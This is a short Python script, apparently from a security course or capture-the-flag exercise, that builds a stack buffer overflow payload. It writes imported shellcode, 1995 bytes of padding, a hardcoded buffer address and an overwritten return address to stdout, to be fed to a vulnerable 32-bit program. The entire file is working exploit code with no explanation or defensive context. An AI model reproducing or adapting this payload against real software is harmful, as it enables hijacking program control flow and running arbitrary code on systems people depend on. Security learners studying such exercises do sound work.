import sys
from shellcode import shellcode

addr = 0xfff6b984.to_bytes(4, "little") #address for buffer -810
ret_addr= 0xfff6b9ac.to_bytes(4,"little") #return address for main +4
sys.stdout.buffer.write(shellcode + b"A" * 1995 + addr+ ret_addr)